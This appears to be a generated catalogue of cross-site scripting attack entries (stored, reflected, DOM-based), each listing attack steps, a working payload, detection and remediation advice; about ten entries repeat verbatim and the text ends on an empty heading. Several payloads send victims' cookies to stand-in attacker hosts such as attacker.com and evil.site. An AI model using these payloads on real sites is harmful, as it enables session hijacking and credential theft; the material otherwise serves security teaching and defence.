# Browser Security → Cross-Site Scripting (XSS) Attacks

## Stored XSS via Blog Comment Box

- **Attack Type**: Stored XSS
- **Target**: Web Application
- **Vulnerability**: Input stored in DB is not sanitized or encoded
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Session hijacking, identity theft
- **Tools**: Burp Suite, XSS Hunter, browser dev tools
- **Scenario**: Attacker injects persistent JavaScript payload into a blog comment field that executes whenever other users view the comment.
- **Attack Steps**: 1. Attacker navigates to a blog post that allows public comments. 2. Opens browser dev tools to inspect the comment form and its request structure. 3. Instead of a normal comment, attacker enters `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`. 4. Submits the comment. 5. The blog stores the comment as-is without sanitizing the input. 6. Any future user who visits the post and loads comments triggers the script. 7. Attacker receives session cookies in real time through their hosted server.
- **Detection**: Scan comment storage with dynamic scanners (e.g., OWASP ZAP)
- **Solution**: Sanitize input and use proper output encoding for HTML context
- **Tags**: #storedxss #cookies #comments #javascript

## Reflected XSS via Search Field

- **Attack Type**: Reflected XSS
- **Target**: Web Application
- **Vulnerability**: Unsanitized user input echoed back into HTML page
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Browser-based code execution and user compromise
- **Tools**: Browser, Burp Suite
- **Scenario**: Attacker crafts a malicious URL containing a script that gets reflected back into the page via the search results header.
- **Attack Steps**: 1. Attacker finds a site with a vulnerable search function, e.g., `example.com/search?q=keyword`. 2. Replaces `keyword` with a script payload like `<script>alert('XSS')</script>`. 3. Constructs a URL: `http://example.com/search?q=<script>alert('XSS')</script>`. 4. When the user clicks the link (e.g., via email), the server reflects back the unencoded input into the HTML content. 5. The browser executes the script in the user’s session context. 6. Attacker can replace alert with data-stealing code or keyloggers.
- **Detection**: Use WAFs with XSS filters and encode dynamic outputs
- **Solution**: Implement strict input validation and auto-escape templates
- **Tags**: #reflectedxss #phishing #alertpopup #webbrowser

## Stored XSS in User Profile Bio Field

- **Attack Type**: Stored XSS
- **Target**: User Profile Pages
- **Vulnerability**: User-submitted fields rendered into DOM without escaping
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Account hijacking, internal access via admin tokens
- **Tools**: XSS Hunter, Firefox Dev Tools
- **Scenario**: Attacker stores malicious script in the “bio” section of their profile, which executes when viewed by admins or users.
- **Attack Steps**: 1. Attacker creates a new user profile on the web application. 2. Navigates to the profile update page and finds a “Bio” or “About Me” text area. 3. Injects a payload like `<img src=x onerror=fetch('https://attacker.io/'+document.cookie)>` and saves the profile. 4. Site stores the payload without sanitization. 5. When any admin or user views that profile page, the image tag fails to load and triggers the `onerror` handler. 6. Attacker receives the victim’s cookies or can embed malicious JS logic.
- **Detection**: Detect unusual image tags and onerror/onload in user content
- **Solution**: Use allowlists and sanitize input fields for bios or names
- **Tags**: #storedxss #profileattack #biofield #onerror

## Reflected XSS in URL Parameter of Login Redirect

- **Attack Type**: Reflected XSS
- **Target**: Web Portal
- **Vulnerability**: Parameter used in HTML without encoding
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Leads to redirection fraud, session token leaks
- **Tools**: URLEncoder, Burp Suite
- **Scenario**: URL redirection logic reflects unsanitized input into HTML resulting in execution of arbitrary JavaScript.
- **Attack Steps**: 1. Attacker notices login redirect URL like `https://target.com/login?next=...`. 2. Injects a script in the parameter: `?next=<script>document.write('XSS')</script>`. 3. Sends phishing link to user: `https://target.com/login?next=<script>...`. 4. Upon loading the login page, the script executes because the server echoes `next` param into a banner or location string. 5. Attacker can modify script to exfiltrate user credentials post-login or fingerprint the user.
- **Detection**: URL validation tools and alert on `<script>` in logs
- **Solution**: Use URL-safe encoding and validate redirection logic
- **Tags**: #redirectxss #reflected #jsinject #webattack

## DOM-Based XSS via innerHTML Injection

- **Attack Type**: DOM-Based XSS
- **Target**: Webpage with Client-Side JS
- **Vulnerability**: Unsafe DOM updates from attacker-controlled input
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Payload bypasses server-side checks and WAFs
- **Tools**: Chrome Dev Tools, XSStrike
- **Scenario**: Attacker manipulates a vulnerable client-side function that directly inserts unsanitized data using innerHTML.
- **Attack Steps**: 1. Attacker finds that `example.com/page#name=John` is used to personalize greeting on page. 2. JavaScript reads fragment (`location.hash`) and uses `innerHTML = "Hi " + name` without validation. 3. Attacker crafts URL: `example.com/page#name=<img src=x onerror=alert(1)>`. 4. User opens it and JS injects it into DOM: `<div>Hi <img src=x onerror=alert(1)></div>`. 5. Script executes because innerHTML parses and renders raw HTML. 6. Attacker can then run scripts to steal cookies, DOM content, or manipulate the UI.
- **Detection**: Use DOMPurify to sanitize data before insertion
- **Solution**: Avoid innerHTML and use safe DOM manipulation like textContent
- **Tags**: #domxss #innerhtml #clientxss #fragmentvector

## Stored XSS via Forum Signature Injection

- **Attack Type**: Stored XSS
- **Target**: Forum Platform
- **Vulnerability**: Signature rendered as raw HTML/JS without filters
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Silent data theft from multiple viewers
- **Tools**: Burp Suite, Firefox Dev Tools
- **Scenario**: Attacker inserts malicious script in forum signature which executes whenever their post is loaded.
- **Attack Steps**: 1. Attacker registers a user on a forum that supports signatures. 2. Edits profile and adds signature: `<script>new Image().src='http://evil.com/log?c='+document.cookie</script>`. 3. Posts a harmless comment in a thread. 4. When any user views the thread, their browser loads the attacker’s signature automatically. 5. Script runs silently and exfiltrates cookies or session data.
- **Detection**: Scan stored HTML for embedded script tags in signatures
- **Solution**: Use BBCode sanitization or render signature as plaintext
- **Tags**: #forumxss #signatureabuse #persistentxss #cookiesnatch

## DOM-Based XSS in Search Suggestion Script

- **Attack Type**: DOM-Based XSS
- **Target**: Web Search Page
- **Vulnerability**: Client-controlled input directly injected into template
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Bypasses backend protection and exploits front-end
- **Tools**: XSStrike, Chrome Dev Tools
- **Scenario**: Search term is injected directly into the DOM via a JavaScript template, making it vulnerable.
- **Attack Steps**: 1. Attacker inspects frontend JS and sees: `document.querySelector('#output').innerHTML = "You searched for: " + decodeURIComponent(location.search)`. 2. Sends user a link: `example.com/search?term=<svg/onload=alert(1)>`. 3. When user opens link, browser processes the script and innerHTML executes embedded XSS payload. 4. Attacker uses this vector to log keystrokes, modify UI, or steal autofill data.
- **Detection**: Detect usage of dangerous DOM sinks with untrusted sources
- **Solution**: Use strict CSP and sanitize inputs client-side
- **Tags**: #domxss #searchinject #frontendbug #xssxsstrike

## Stored XSS in Product Review Field

- **Attack Type**: Stored XSS
- **Target**: E-Commerce Platform
- **Vulnerability**: User-generated reviews not sanitized
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Persistent access via victim interactions with product
- **Tools**: XSS Hunter, Firefox Dev Tools
- **Scenario**: Payload is embedded in product review and executes whenever the review is viewed.
- **Attack Steps**: 1. Attacker navigates to product page and submits review like: "Great product! <script>fetch('http://evil.site/'+document.cookie)</script>". 2. Web app saves and displays reviews inline without escaping HTML tags. 3. Any customer or admin viewing that product triggers the malicious script. 4. Attacker collects session data, tokens, or other info via remote server.
- **Detection**: Search for script tags or JavaScript keywords in review database
- **Solution**: Use content security policy + HTML escaping on output
- **Tags**: #storedxss #ecommerce #reviews #javascriptpayload

## Reflected XSS in Support Ticket System

- **Attack Type**: Reflected XSS
- **Target**: Ticketing Platform
- **Vulnerability**: Query param directly reflected without escaping
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Privilege escalation via reflected vector in internal tool
- **Tools**: Burp Suite, ZAP Proxy
- **Scenario**: Support platform reflects message input back into HTML without sanitization.
- **Attack Steps**: 1. Attacker finds support ticket URL: `site.com/support?issue=...`. 2. Crafts payload: `<script>document.location='http://attacker.io?c='+document.cookie</script>`. 3. Constructs URL: `site.com/support?issue=<script>...`. 4. Sends link to internal staff or support agents. 5. When they open it, script executes and exfiltrates credentials or session info.
- **Detection**: Audit logs for script patterns in GET requests
- **Solution**: Filter HTML from all user-submitted URL content
- **Tags**: #supportxss #ticketingreflected #phishingxss #cookiesniff

## DOM-Based XSS from LocalStorage Injection

- **Attack Type**: DOM-Based XSS
- **Target**: Single Page App (SPA)
- **Vulnerability**: LocalStorage content used unsafely in rendering
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Client-side persistent compromise and UI manipulation
- **Tools**: Browser Console, XSStrike
- **Scenario**: Site uses localStorage value in `innerHTML` without sanitizing content.
- **Attack Steps**: 1. Attacker injects malicious value into `localStorage.setItem("user","<img src=x onerror=alert(1)>")`. 2. Site’s JavaScript runs: `document.getElementById('userbox').innerHTML = localStorage.getItem("user")`. 3. When victim visits the page, innerHTML loads and executes the malicious content. 4. Attack could originate from prior XSS or extension abuse.
- **Detection**: Detect innerHTML assignments from localStorage sources
- **Solution**: Sanitize or validate localStorage before DOM rendering
- **Tags**: #localstorage #domxss #spaattack #htmlinjection

## Stored XSS via HTML Editor in CMS

- **Attack Type**: Stored XSS
- **Target**: CMS Page or Blog Post
- **Vulnerability**: Unsanitized HTML content in WYSIWYG editors
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Session hijacking, persistent access
- **Tools**: Burp Suite, XSS Hunter, TinyMCE
- **Scenario**: Attacker uses WYSIWYG HTML editor to embed malicious JavaScript which is stored in CMS and executed when viewed.
- **Attack Steps**: 1. Attacker registers or gains author-level access on a CMS platform (like WordPress or Joomla). 2. They create a new blog post or page using the CMS’s rich text (WYSIWYG) editor. 3. Switching to HTML/source view, they insert a payload like `<script>fetch('http://attacker.site/steal?c='+document.cookie)</script>`. 4. The CMS stores the raw HTML, including the script tag, in the database. 5. When any user or admin later views this post, the script executes inside their browser context. 6. The attacker’s server receives sensitive cookies or session tokens from victims. 7. This method persists across visits and requires no user interaction. 8. Attackers may use obfuscation or hide the script inside images or styled divs to avoid suspicion.
- **Detection**: Regularly scan content fields for scripts; inspect editor input
- **Solution**: Strip or sanitize dangerous tags in user-generated HTML
- **Tags**: #cmsxss #storedxss #wysiwygattack #htmlinjection

## Reflected XSS via OpenID Redirect

- **Attack Type**: Reflected XSS
- **Target**: Login or Auth Flow
- **Vulnerability**: Unsafe URL parameters reflected into page
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Phishing, clickjacking, login hijack
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: Attacker exploits OpenID login URL by injecting script into the redirection parameter.
- **Attack Steps**: 1. Attacker identifies OpenID login URLs like `example.com/openid?next=...`. 2. They craft a malicious payload: `example.com/openid?next=<script>alert(123)</script>`. 3. Victim clicks the phishing link. 4. The server reflects the “next” parameter into the HTML output without sanitizing or encoding it. 5. Browser executes the embedded script immediately. 6. This may be used to run spyware, steal credentials, or perform UI redressing on the login form. 7. More complex variants may load external JavaScript to build phishing interfaces or log keys.
- **Detection**: Detect reflection of HTML tags in response body
- **Solution**: Validate and encode redirection parameters strictly
- **Tags**: #reflectedxss #openidattack #authredirect #phishingvector

## DOM-Based XSS via Search Result Loader

- **Attack Type**: DOM-Based XSS
- **Target**: Search Page in Web App
- **Vulnerability**: Unsafe DOM sink: innerHTML with untrusted input
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Client-side compromise with full JS execution
- **Tools**: XSStrike, Chrome DevTools
- **Scenario**: Client-side JS pulls search term from URL and renders it using innerHTML without escaping.
- **Attack Steps**: 1. Attacker discovers that the search page uses `location.search` to show the search keyword like: `document.getElementById("term").innerHTML = "You searched for: " + searchParam;`. 2. They craft a URL like `example.com/search?q=<img src=x onerror=alert('DOMXSS')>`. 3. When the victim opens the URL, the innerHTML renders the payload directly into the DOM. 4. The image fails to load, triggering `onerror`. 5. Script executes in the browser, allowing data theft or malicious redirection. 6. This bypasses all server-side protections since the injection and execution occur entirely on the client. 7. More advanced payloads can be obfuscated to avoid detection or fingerprint browsers.
- **Detection**: Audit JS sinks like innerHTML, document.write, outerHTML
- **Solution**: Use DOMPurify or enforce `textContent` over innerHTML
- **Tags**: #domxss #searchfunction #frontendbug #clientattack

## Stored XSS via Feedback Form

- **Attack Type**: Stored XSS
- **Target**: Feedback/Support Backend
- **Vulnerability**: Stored input rendered into admin pages unsanitized
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Privileged account compromise, lateral movement
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Attacker submits feedback with embedded JS which gets rendered in the admin review panel.
- **Attack Steps**: 1. Attacker locates a public feedback form that stores submissions for internal review. 2. In the message field, they enter: `<script>navigator.sendBeacon('http://evil.site?c='+document.cookie)</script>`. 3. Form is submitted and stored in the backend. 4. Admin opens the dashboard to read feedback. 5. The admin’s browser executes the stored script. 6. Attack captures cookies, session tokens, or can run further scripts. 7. This is especially effective if the admin panel lacks CSP or script filtering. 8. Attackers often use invisible scripts that execute silently or beacon data to C2.
- **Detection**: Monitor fields rendered in dashboards; inspect unusual input
- **Solution**: Sanitize all rendered fields before displaying in admin UIs
- **Tags**: #storedxss #feedbackattack #admincompromise #silentpayload

## Reflected XSS via 404 Error Page

- **Attack Type**: Reflected XSS
- **Target**: Error Page
- **Vulnerability**: Content from user-controlled path is reflected into DOM
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Script execution on standard system pages
- **Tools**: ZAP Proxy, Firefox DevTools
- **Scenario**: Error page reflects invalid URL input into HTML output without sanitization.
- **Attack Steps**: 1. Attacker inputs a malformed URL like `site.com/404<script>alert(1)</script>`. 2. The 404 error page dynamically displays the invalid path: “Page /404<script>alert(1)</script> not found.” 3. Browser interprets the script tag and executes it. 4. This can be used to serve malicious payloads via typo-squatted links. 5. More complex variants inject `<iframe>`, `<img onerror>`, or external script loaders.
- **Detection**: Scan error page rendering paths for unsanitized input
- **Solution**: Filter special characters and escape all HTML context in error views
- **Tags**: #404xss #reflectedxss #urlinject #pathbasedattack

## DOM-Based XSS via document.write in Marketing Banner

- **Attack Type**: DOM-Based XSS
- **Target**: Promo or Campaign Page
- **Vulnerability**: Unsafe use of document.write with query parameters
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Direct client-side script execution from query string
- **Tools**: DevTools Console, XSStrike
- **Scenario**: Marketing script dynamically loads messages into page using document.write with query string input.
- **Attack Steps**: 1. Marketing page includes code like `document.write(decodeURIComponent(location.search.substring(1)))`. 2. Attacker creates a URL: `promo.html?<svg/onload=alert('BannerXSS')>`. 3. When the link is opened, the browser executes the `document.write` with the injected payload. 4. No server interaction occurs — pure DOM-level compromise. 5. Attacker uses this to launch popups, redirect users, or inject hidden payloads. 6. May also be chained with session identifiers for credential harvesting.
- **Detection**: Search frontend JS for document.write usage with URL input
- **Solution**: Deprecate document.write or wrap input with sanitization
- **Tags**: #domxss #marketingbug #clientxss #scriptinject

## Stored XSS via Calendar Event Title

- **Attack Type**: Stored XSS
- **Target**: Calendar Web App
- **Vulnerability**: Unescaped HTML in calendar metadata
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Data exposure or impersonation via trusted calendar interface
- **Tools**: XSS Hunter, Burp Suite
- **Scenario**: Event title field accepts script tags that execute when calendar is viewed.
- **Attack Steps**: 1. Attacker adds a calendar event with title: `<script>alert('XSS')</script>`. 2. The application stores it and renders the title in the event card UI. 3. When user/admin views the calendar, the script runs. 4. Attacker can use obfuscated payloads to harvest data or manipulate UI. 5. Some calendar apps sync to email or notification services, expanding the reach.
- **Detection**: Inspect stored events for script patterns; use email gateways for scanning
- **Solution**: Sanitize and encode all metadata before rendering on UI
- **Tags**: #storedxss #calendarbug #eventinject #uivuln

## Reflected XSS in Forgot Password Email Field

- **Attack Type**: Reflected XSS
- **Target**: Password Reset Page
- **Vulnerability**: Unsanitized reflection of input in page body
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: User data leak, phishing, credential interception
- **Tools**: Burp Suite, Browser Tools
- **Scenario**: Attacker injects payload in email field which is echoed in response HTML.
- **Attack Steps**: 1. Forgot password form submits email and shows message: “Instructions sent to [email].” 2. Attacker crafts a link like: `site.com/reset?email=<img src=x onerror=alert('xss')>`. 3. When link is opened, message renders with HTML tags interpreted. 4. The payload executes instantly. 5. Can be used in phishing campaigns mimicking password resets.
- **Detection**: Detect injection through GET/POST and encode HTML output
- **Solution**: Always encode user-supplied data used in confirmation messages
- **Tags**: #reflectedxss #forgotpassword #emailinject #sessionsteal

## DOM-Based XSS via localStorage Template Injection

- **Attack Type**: DOM-Based XSS
- **Target**: SPA / Local Apps
- **Vulnerability**: Local storage injected into DOM directly
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Script runs on return visits without user interaction
- **Tools**: Browser Console, XSStrike
- **Scenario**: Page loads content from localStorage into innerHTML without sanitization.
- **Attack Steps**: 1. Attacker sets localStorage using: `localStorage.setItem('msg','<svg onload=alert(1)>')`. 2. Victim loads the page and JavaScript runs: `document.getElementById("msgbox").innerHTML = localStorage.getItem("msg");`. 3. Script is executed from localStorage context. 4. This persists across reloads until cleared. 5. May come from previous XSS or compromised extensions.
- **Detection**: Audit localStorage values and DOM usage; alert on anomalies
- **Solution**: Validate and sanitize data pulled from browser storage
- **Tags**: #domxss #localstorage #templatexss #persistentclientxss

## Stored XSS in Comment Reply Functionality

- **Attack Type**: Stored XSS
- **Target**: Forum or Article Platform
- **Vulnerability**: Script stored in nested content with no escape
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Session theft, impersonation, spam propagation
- **Tools**: Burp Suite, Firefox Dev Tools
- **Scenario**: Attacker replies to another user’s comment with a malicious script, triggering execution on view.
- **Attack Steps**: 1. Attacker posts a reply to an existing comment with: `<script>alert('ReplyXSS')</script>`. 2. The comment thread system renders replies inline with no sanitization. 3. Victim opens the thread and script executes in their browser. 4. Payload may impersonate other users or silently extract data. 5. Attack can propagate if others copy/paste infected reply.
- **Detection**: Search for script tags in nested comment threads
- **Solution**: Strip tags and use proper encoding in all comment content
- **Tags**: #storedxss #replyxss #nestedcomments #contentinject

## Stored XSS via HTML Editor in CMS

- **Attack Type**: Stored XSS
- **Target**: CMS Page or Blog Post
- **Vulnerability**: Unsanitized HTML content in WYSIWYG editors
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Session hijacking, persistent access
- **Tools**: Burp Suite, XSS Hunter, TinyMCE
- **Scenario**: Attacker uses WYSIWYG HTML editor to embed malicious JavaScript which is stored in CMS and executed when viewed.
- **Attack Steps**: 1. Attacker registers or gains author-level access on a CMS platform (like WordPress or Joomla). 2. They create a new blog post or page using the CMS’s rich text (WYSIWYG) editor. 3. Switching to HTML/source view, they insert a payload like <script>fetch('http://attacker.site/steal?c='+document.cookie)</script>. 4. The CMS stores the raw HTML, including the script tag, in the database. 5. When any user or admin later views this post, the script executes inside their browser context. 6. The attacker’s server receives sensitive cookies or session tokens from victims. 7. This method persists across visits and requires no user interaction. 8. Attackers may use obfuscation or hide the script inside images or styled divs to avoid suspicion.
- **Detection**: Regularly scan content fields for scripts; inspect editor input
- **Solution**: Strip or sanitize dangerous tags in user-generated HTML
- **Tags**: #cmsxss #storedxss #wysiwygattack #htmlinjection

## Reflected XSS via OpenID Redirect

- **Attack Type**: Reflected XSS
- **Target**: Login or Auth Flow
- **Vulnerability**: Unsafe URL parameters reflected into page
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Phishing, clickjacking, login hijack
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: Attacker exploits OpenID login URL by injecting script into the redirection parameter.
- **Attack Steps**: 1. Attacker identifies OpenID login URLs like example.com/openid?next=.... 2. They craft a malicious payload: example.com/openid?next=<script>alert(123)</script>. 3. Victim clicks the phishing link. 4. The server reflects the “next” parameter into the HTML output without sanitizing or encoding it. 5. Browser executes the embedded script immediately. 6. This may be used to run spyware, steal credentials, or perform UI redressing on the login form. 7. More complex variants may load external JavaScript to build phishing interfaces or log keys.
- **Detection**: Detect reflection of HTML tags in response body
- **Solution**: Validate and encode redirection parameters strictly
- **Tags**: #reflectedxss #openidattack #authredirect #phishingvector

## DOM-Based XSS via Search Result Loader

- **Attack Type**: DOM-Based XSS
- **Target**: Search Page in Web App
- **Vulnerability**: Unsafe DOM sink: innerHTML with untrusted input
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Client-side compromise with full JS execution
- **Tools**: XSStrike, Chrome DevTools
- **Scenario**: Client-side JS pulls search term from URL and renders it using innerHTML without escaping.
- **Attack Steps**: 1. Attacker discovers that the search page uses location.search to show the search keyword like: document.getElementById("term").innerHTML = "You searched for: " + searchParam;. 2. They craft a URL like example.com/search?q=<img src=x onerror=alert('DOMXSS')>. 3. When the victim opens the URL, the innerHTML renders the payload directly into the DOM. 4. The image fails to load, triggering onerror. 5. Script executes in the browser, allowing data theft or malicious redirection. 6. This bypasses all server-side protections since the injection and execution occur entirely on the client. 7. More advanced payloads can be obfuscated to avoid detection or fingerprint browsers.
- **Detection**: Audit JS sinks like innerHTML, document.write, outerHTML
- **Solution**: Use DOMPurify or enforce textContent over innerHTML
- **Tags**: #domxss #searchfunction #frontendbug #clientattack

## Stored XSS via Feedback Form

- **Attack Type**: Stored XSS
- **Target**: Feedback/Support Backend
- **Vulnerability**: Stored input rendered into admin pages unsanitized
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Privileged account compromise, lateral movement
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Attacker submits feedback with embedded JS which gets rendered in the admin review panel.
- **Attack Steps**: 1. Attacker locates a public feedback form that stores submissions for internal review. 2. In the message field, they enter: <script>navigator.sendBeacon('http://evil.site?c='+document.cookie)</script>. 3. Form is submitted and stored in the backend. 4. Admin opens the dashboard to read feedback. 5. The admin’s browser executes the stored script. 6. Attack captures cookies, session tokens, or can run further scripts. 7. This is especially effective if the admin panel lacks CSP or script filtering. 8. Attackers often use invisible scripts that execute silently or beacon data to C2.
- **Detection**: Monitor fields rendered in dashboards; inspect unusual input
- **Solution**: Sanitize all rendered fields before displaying in admin UIs
- **Tags**: #storedxss #feedbackattack #admincompromise #silentpayload

## Reflected XSS via 404 Error Page

- **Attack Type**: Reflected XSS
- **Target**: Error Page
- **Vulnerability**: Content from user-controlled path is reflected into DOM
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Script execution on standard system pages
- **Tools**: ZAP Proxy, Firefox DevTools
- **Scenario**: Error page reflects invalid URL input into HTML output without sanitization.
- **Attack Steps**: 1. Attacker inputs a malformed URL like site.com/404<script>alert(1)</script>. 2. The 404 error page dynamically displays the invalid path: “Page /404alert(1) not found.” 3. Browser interprets the script tag and executes it. 4. This can be used to serve malicious payloads via typo-squatted links. 5. More complex variants inject <iframe>, <img onerror>, or external script loaders.
- **Detection**: Scan error page rendering paths for unsanitized input
- **Solution**: Filter special characters and escape all HTML context in error views
- **Tags**: #404xss #reflectedxss #urlinject #pathbasedattack

## DOM-Based XSS via document.write in Marketing Banner

- **Attack Type**: DOM-Based XSS
- **Target**: Promo or Campaign Page
- **Vulnerability**: Unsafe use of document.write with query parameters
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Direct client-side script execution from query string
- **Tools**: DevTools Console, XSStrike
- **Scenario**: Marketing script dynamically loads messages into page using document.write with query string input.
- **Attack Steps**: 1. Marketing page includes code like document.write(decodeURIComponent(location.search.substring(1))). 2. Attacker creates a URL: promo.html?<svg/onload=alert('BannerXSS')>. 3. When the link is opened, the browser executes the document.write with the injected payload. 4. No server interaction occurs — pure DOM-level compromise. 5. Attacker uses this to launch popups, redirect users, or inject hidden payloads. 6. May also be chained with session identifiers for credential harvesting.
- **Detection**: Search frontend JS for document.write usage with URL input
- **Solution**: Deprecate document.write or wrap input with sanitization
- **Tags**: #domxss #marketingbug #clientxss #scriptinject

## Stored XSS via Calendar Event Title

- **Attack Type**: Stored XSS
- **Target**: Calendar Web App
- **Vulnerability**: Unescaped HTML in calendar metadata
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Data exposure or impersonation via trusted calendar interface
- **Tools**: XSS Hunter, Burp Suite
- **Scenario**: Event title field accepts script tags that execute when calendar is viewed.
- **Attack Steps**: 1. Attacker adds a calendar event with title: <script>alert('XSS')</script>. 2. The application stores it and renders the title in the event card UI. 3. When user/admin views the calendar, the script runs. 4. Attacker can use obfuscated payloads to harvest data or manipulate UI. 5. Some calendar apps sync to email or notification services, expanding the reach.
- **Detection**: Inspect stored events for script patterns; use email gateways for scanning
- **Solution**: Sanitize and encode all metadata before rendering on UI
- **Tags**: #storedxss #calendarbug #eventinject #uivuln

## Reflected XSS in Forgot Password Email Field

- **Attack Type**: Reflected XSS
- **Target**: Password Reset Page
- **Vulnerability**: Unsanitized reflection of input in page body
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: User data leak, phishing, credential interception
- **Tools**: Burp Suite, Browser Tools
- **Scenario**: Attacker injects payload in email field which is echoed in response HTML.
- **Attack Steps**: 1. Forgot password form submits email and shows message: “Instructions sent to [email].” 2. Attacker crafts a link like: site.com/reset?email=<img src=x onerror=alert('xss')>. 3. When link is opened, message renders with HTML tags interpreted. 4. The payload executes instantly. 5. Can be used in phishing campaigns mimicking password resets.
- **Detection**: Detect injection through GET/POST and encode HTML output
- **Solution**: Always encode user-supplied data used in confirmation messages
- **Tags**: #reflectedxss #forgotpassword #emailinject #sessionsteal

## DOM-Based XSS via localStorage Template Injection

- **Attack Type**: DOM-Based XSS
- **Target**: SPA / Local Apps
- **Vulnerability**: Local storage injected into DOM directly
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Script runs on return visits without user interaction
- **Tools**: Browser Console, XSStrike
- **Scenario**: Page loads content from localStorage into innerHTML without sanitization.
- **Attack Steps**: 1. Attacker sets localStorage using: localStorage.setItem('msg','<svg onload=alert(1)>'). 2. Victim loads the page and JavaScript runs: document.getElementById("msgbox").innerHTML = localStorage.getItem("msg");. 3. Script is executed from localStorage context. 4. This persists across reloads until cleared. 5. May come from previous XSS or compromised extensions.
- **Detection**: Audit localStorage values and DOM usage; alert on anomalies
- **Solution**: Validate and sanitize data pulled from browser storage
- **Tags**: #domxss #localstorage #templatexss #persistentclientxss

## Stored XSS in Comment Reply Functionality

- **Attack Type**: Stored XSS
- **Target**: Forum or Article Platform
- **Vulnerability**: Script stored in nested content with no escape
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Session theft, impersonation, spam propagation
- **Tools**: Burp Suite, Firefox Dev Tools
- **Scenario**: Attacker replies to another user’s comment with a malicious script, triggering execution on view.
- **Attack Steps**: 1. Attacker posts a reply to an existing comment with: <script>alert('ReplyXSS')</script>. 2. The comment thread system renders replies inline with no sanitization. 3. Victim opens the thread and script executes in their browser. 4. Payload may impersonate other users or silently extract data. 5. Attack can propagate if others copy/paste infected reply.
- **Detection**: Search for script tags in nested comment threads
- **Solution**: Strip tags and use proper encoding in all comment content
- **Tags**: #storedxss #replyxss #nestedcomments #contentinject

## Hybrid XSS via Insecure Preview Links

- **Attack Type**: Stored + Reflected XSS
- **Target**: Preview Pages or CMS Draft View
- **Vulnerability**: Stored content reflected via GET params
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Multi-vector payload delivery, session theft
- **Tools**: Burp Suite, XSS Hunter
- **Scenario**: Preview feature stores unfiltered script in DB, and reflects it when accessed via link.
- **Attack Steps**: 1. Attacker writes a post with the title containing <script>alert('Stored+Reflected')</script>. 2. The system stores it in the database, and when someone clicks a preview link like /preview?id=123, the script is reflected into the HTML output without sanitization. 3. The stored data is now both persisted and reflected, causing hybrid XSS. 4. Victims visiting the preview link get immediate script execution.
- **Detection**: Inspect how stored fields are reflected in dynamic views
- **Solution**: Encode reflected output and sanitize stored inputs
- **Tags**: #hybridxss #storedxss #reflectedpreview

## DOM-Based XSS in QR Code Generator Tool

- **Attack Type**: DOM-Based XSS
- **Target**: Marketing Tools / QR Web Apps
- **Vulnerability**: Unsafe DOM rendering of query input
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Silent client-side execution
- **Tools**: XSStrike, Dev Console
- **Scenario**: URL used to generate QR is parsed and injected into HTML without filtering.
- **Attack Steps**: 1. QR code tool accepts a URL via ?text= and uses innerHTML to show it back. 2. Attacker sends example.com/qr?text=<img src=x onerror=alert(42)>. 3. When visited, the payload runs due to unescaped rendering in DOM. 4. Since QR tools are widely shared, they are ideal for XSS propagation.
- **Detection**: Check DOM usage of query strings
- **Solution**: Sanitize text before DOM output
- **Tags**: #domxss #qrtool #xsspayload

## Stored XSS in Internal Admin Memo System

- **Attack Type**: Stored XSS
- **Target**: Internal Admin Portals
- **Vulnerability**: Rich-text notes rendered without sanitization
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Admin takeover, lateral movement
- **Tools**: XSS Hunter, Burp Suite
- **Scenario**: Attacker injects payload in internal notes which auto-render in dashboards.
- **Attack Steps**: 1. Attacker with internal access creates a memo or case note using <script>fetch("https://evil.site?c="+document.cookie)</script>. 2. The memo is saved in DB and appears on admin dashboards. 3. When an admin logs in and views the case, the script executes. 4. This can compromise higher-privileged accounts or initiate internal beaconing.
- **Detection**: Monitor HTML/script patterns in internal notes
- **Solution**: Use strict input encoding for all internal HTML fields
- **Tags**: #internalxss #storedxss #adminpanelxss

## Reflected XSS in Export File Parameter

- **Attack Type**: Reflected XSS
- **Target**: Export/Download Pages
- **Vulnerability**: Unescaped filename parameter reflected
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Drive-by script execution, phishing
- **Tools**: Burp Suite, Firefox DevTools
- **Scenario**: Filename in export/download API is reflected into response HTML.
- **Attack Steps**: 1. Attacker crafts a link: /download?filename=<script>alert(44)</script>. 2. The page displays: "Download <script>alert(44)</script> ready." 3. The browser executes the script instantly if no escaping is in place. 4. Exploited via phishing emails disguised as legit export links.
- **Detection**: Scan HTML output for unencoded URL inputs
- **Solution**: Encode dynamic fields in UI, avoid direct reflection
- **Tags**: #reflectedxss #downloadpage #exportvuln

## DOM-Based XSS in Analytics Dashboard Filter

